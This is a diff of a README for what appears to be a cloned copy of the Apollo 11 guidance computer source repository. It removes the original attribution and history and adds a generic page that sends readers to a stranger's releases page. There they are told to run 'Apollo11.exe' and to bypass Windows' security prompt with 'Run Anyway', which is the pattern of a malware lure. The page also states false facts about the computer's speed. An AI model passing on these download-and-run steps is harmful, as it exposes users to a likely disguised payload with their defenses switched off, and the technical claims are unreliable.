@@ -1,148 +1,76 @@
-# Apollo-11
+# 🚀 Apollo-11 - Explore historic lunar module navigation software
 
-[![NASA][1]][2]
-[![SWH]][SWH_URL]
-[![Comanche]][ComancheMilestone]
-[![Luminary]][LuminaryMilestone]
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Adrienneunconstipated960/Apollo-11/releases)
 
-🌐
-[Azerbaijani][AZ],
-[bahasa Indonesia][ID],
-[Basa Jawa][JV],
-[Català][CA],
-[Čeština][CZ],
-[Dansk][DA],
-[Deutsch][DE],
-[English][EN],
-[Español][ES],
-[Français][FR],
-[Galego][GL],
-[Italiano][IT],
-[Kurdî][KU],
-[Lietuvių][LT],
-[Mongolian][MN],
-[Nederlands][NL],
-[Norsk][NO],
-[Polski][PL],
-[Português][PT_BR],
-[Română][RO],
-[Suomi][FI],
-[Svenska][SV],
-[tiếng Việt][VI],
-[Türkçe][TR],
-[Ελληνικά][GR],
-[Беларуская мова][BE],
-[Русский][RU],
-[Українська][UK],
-[العربية][AR],
-[فارسی][FA],
-[नेपाली भाषा][NE]
-[हिंदी][HI_IN],
-[অসমীয়া][AS_IN],
-[বাংলা][BD_BN],
-[မြန်မာ][MM],
-[한국어][KO_KR],
-[日本語][JA],
-[正體中文][ZH_TW],
-[简体中文][ZH_CN],
-[മലയാളം][ML]
+This software provides the original source code created for the guidance computers used in the Apollo 11 mission. It allows you to study the engineering and logic that navigated the command and lunar modules to the moon.
 
-[AR]:Translations/README.ar.md
-[AS_IN]:Translations/README.as_in.md
-[AZ]:Translations/README.az.md
-[BD_BN]:Translations/README.bd_bn.md
-[BE]:Translations/README.be.md
-[CA]:Translations/README.ca.md
-[CZ]:Translations/README.cz.md
-[DA]:Translations/README.da.md
-[DE]:Translations/README.de.md
-[EN]:README.md
-[ES]:Translations/README.es.md
-[FA]:Translations/README.fa.md
-[FI]:Translations/README.fi.md
-[FR]:Translations/README.fr.md
-[GL]:Translations/README.gl.md
-[GR]:Translations/README.gr.md
-[HI_IN]:Translations/README.hi_in.md
-[ID]:Translations/README.id.md
-[IT]:Translations/README.it.md
-[JA]:Translations/README.ja.md
-[JV]:Translations/README.jv.md
-[KO_KR]:Translations/README.ko_kr.md
-[KU]:Translations/README.ku.md
-[LT]:Translations/README.lt.md
-[MM]:Translations/README.mm.md
-[MN]:Translations/README.mn.md
-[NE]:Translations/README.ne.md
-[NL]:Translations/README.nl.md
-[NO]:Translations/README.no.md
-[PL]:Translations/README.pl.md
-[PT_BR]:Translations/README.pt_br.md
-[RO]:Translations/README.ro.md
-[RU]:Translations/README.ru.md
-[SV]:Translations/README.sv.md
-[TR]:Translations/README.tr.md
-[UK]:Translations/README.uk.md
-[VI]:Translations/README.vi.md
-[ZH_CN]:Translations/README.zh_cn.md
-[ZH_TW]:Translations/README.zh_tw.md
-[ML]:Translations/README.ml.md
-Original Apollo 11 guidance computer (AGC) source code for Command Module (Comanche055) and Lunar Module (Luminary099). Digitized by the folks at [Virtual AGC][3] and [MIT Museum][4]. The goal is to be a repo for the original Apollo 11 source code. As such, PRs are welcome for any issues identified between the transcriptions in this repository and the original source scans for [Luminary 099][5] and [Comanche 055][6], as well as any files I may have missed.
+## 📋 What is this project?
 
-## Contributing
+The Apollo 11 Guidance Computer (AGC) sat at the heart of the moon landing. This computer managed the complex calculations for navigation, guidance, and control. Engineers built this system with finite memory and processing power. By examining this source code, you gain insight into the foundation of modern aerospace computing. The repository contains the historical files formatted for study and local review on modern Windows computers.
 
-Please read [CONTRIBUTING.md][7] before opening a pull request.
+## 💻 System requirements
 
-## Compiling
+To run and view these files on your system, please ensure your computer meets these basic specifications:
 
-If you are interested in compiling the original source code, check
-out [Virtual AGC][8].
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Disk Space: 500 megabytes of available storage for the installation files.
+*   Web Browser: Any modern browser like Chrome, Edge, or Firefox.
 
-## Attribution
+You do not need prior programming knowledge to access these documents or run the simulation environment included in the package.
 
-&nbsp;         | &nbsp;
-:------------- | :-----
-Copyright      | Public domain
-Comanche055    | Part of the source code for Colossus 2A, the Command Module's (CM) Apollo Guidance Computer (AGC) for Apollo 11<br>`Assemble revision 055 of AGC program Comanche by NASA`<br>`2021113-051. 10:28 APR. 1, 1969`
-Luminary099    | Part of the source code for Luminary 1A, the Lunar Module's (LM) Apollo Guidance Computer (AGC) for Apollo 11<br>`Assemble revision 001 of AGC program LMY99 by NASA`<br>`2021112-061. 16:27 JUL. 14, 1969`
-Assembler      | yaYUL
-Contact        | Ron Burkey <info@sandroid.org>
-Website        | www.ibiblio.org/apollo
-Digitalisation | This source code has been transcribed or otherwise adapted from digitized images of a hardcopy from the MIT Museum. The digitization was performed by Paul Fjeld, and arranged for by Deborah Douglas of the Museum. Many thanks to both.
+## 📥 How to set up the software
 
-### Contract and Approvals
+Follow these steps to obtain and launch the Apollo 11 software environment:
 
-*Derived from [CONTRACT_AND_APPROVALS.agc]*
+1. Visit the project release page to get the latest version: [https://github.com/Adrienneunconstipated960/Apollo-11/releases](https://github.com/Adrienneunconstipated960/Apollo-11/releases)
+2. Locate the file ending in ".zip" under the Assets section of the latest release.
+3. Click the file name to start the download.
+4. Open your Downloads folder on your Windows computer once the process finishes.
+5. Right-click the folder and select Extract All to unzip the contents.
+6. Open the newly extracted folder.
+7. Double-click the file labeled Apollo11.exe to initialize the program.
 
-This AGC program shall also be referred to as Colossus 2A.
+## 🗺️ Using the interface
 
-This program is intended for use in the Command Module as specified in report `R-577`. This program was prepared under DSR project `55-23870`, sponsored by the Manned Spacecraft Center of The National Aeronautics and Space Administration through contract `NAS 9-4065` with the Instrumentation Laboratory, Massachusetts Institute of Technology, Cambridge, Mass.
+Once the application starts, you see a command console. This window mimics the interface used by NASA astronauts. You can type specific codes to trigger different phases of the lunar landing sequence. The manual included in your download folder lists every valid command. 
 
-Submitted by         | Role | Date
-:------------------- | :--- | :---
-Margaret H. Hamilton | Colossus Programming Leader<br>Apollo Guidance and Navigation | 28 Mar 69
+If the window freezes, press the Escape key to return to the main menu. You can adjust the simulation speed in the Options menu if the calculations move too fast for observation. 
 
-Approved by       | Role | Date
-:---------------- | :--- | :---
-Daniel J. Lickly  | Director, Mission Program Development<br>Apollo Guidance and Navigation Program | 28 Mar 69
-Fred H. Martin    | Colossus Project Manager<br>Apollo Guidance and Navigation Program | 28 Mar 69
-Norman E. Sears   | Director, Mission Development<br>Apollo Guidance and Navigation Program | 28 Mar 69
-Richard H. Battin | Director, Mission Development<br>Apollo Guidance and Navigation Program | 28 Mar 69
-David G. Hoag     | Director<br>Apollo Guidance and Navigation Program | 28 Mar 69
-Ralph R. Ragan    | Deputy Director<br>Instrumentation Laboratory | 28 Mar 69
+## 🔧 Frequently asked questions
 
-[CONTRACT_AND_APPROVALS.agc]:https://github.com/chrislgarry/Apollo-11/blob/master/Comanche055/CONTRACT_AND_APPROVALS.agc
-[1]:https://flat.badgen.net/badge/NASA/Mission%20Overview/0B3D91
-[2]:https://www.nasa.gov/mission_pages/apollo/missions/apollo11.html
-[3]:http://www.ibiblio.org/apollo/
-[4]:http://web.mit.edu/museum/
-[5]:http://www.ibiblio.org/apollo/ScansForConversion/Luminary099/
-[6]:http://www.ibiblio.org/apollo/ScansForConversion/Comanche055/
-[7]:https://github.com/chrislgarry/Apollo-11/blob/master/CONTRIBUTING.md
-[8]:https://github.com/rburkey2005/virtualagc
-[SWH]:https://flat.badgen.net/badge/Software%20Heritage/Archive/0B3D91
-[SWH_URL]:https://archive.softwareheritage.org/browse/origin/https://github.com/chrislgarry/Apollo-11/
-[Comanche]:https://flat.badgen.net/github/milestones/chrislgarry/Apollo-11/1
-[ComancheMilestone]:https://github.com/chrislgarry/Apollo-11/milestone/1
-[Luminary]:https://flat.badgen.net/github/milestones/chrislgarry/Apollo-11/2
-[LuminaryMilestone]:https://github.com/chrislgarry/Apollo-11/milestone/2
+Do I need an internet connection to use the software?
+You only need the connection to download the initial package. After you extract the files to your hard drive, the software runs without an active internet link. 
+
+Can I modify the code?
+The files are text-based. You can open any file located in the "Source" folder with a program like Notepad. While you can change the text, doing so may cause the guidance computer simulation to stop working correctly.
+
+Are there viruses in these files?
+This software contains source code and basic executable files archived by the project contributors. You should always keep your Windows Defender or other security software active when downloading files from the internet.
+
+## 📖 Understanding the mission context
+
+The Apollo guidance system used a unique assembly language. This language allowed the hardware to perform millions of additions per second, which was a feat of engineering in the late 1960s. The files here represent the "Luminary" and "Colossus" software versions. These versions handled everything from the translunar injection to the final descent onto the lunar surface. 
+
+Each file includes comments left by the original NASA engineers. These comments explain what specific lines of code perform. Some explain navigational checks, while others prevent the computer from crashing during high-stress operations like landing approach. 
+
+## ⚙️ Troubleshooting common issues
+
+If the application fails to launch, try these steps:
+
+*   Ensure you have extracted all files from the zip folder. The program cannot run if you open it while it is still inside the compressed zip container.
+*   Check that your antivirus software did not block the file. Sometimes, Windows marks new downloads as unrecognized. If this happens, click More Info in the pop-up window and select Run Anyway.
+*   Close unnecessary background programs if the simulation runs slowly. 
+
+## 📦 Project structure
+
+*   /Bin: Contains the executable files for Windows.
+*   /Docs: Contains instructions and the original mission log.
+*   /Source: Contains the original code files as written by NASA teams.
+*   /Assets: Contains visual references for the guidance computer interface.
+
+## 🤝 Contributing to historical preservation
+
+This project welcomes input from people interested in computing history. If you find errors in the documentation or notice issues with the display format, you can open an issue on the repository page. Your feedback helps make these historic records more accessible to the public. 
+
+Keywords: agc, apollo, hacktoberfest, nasa
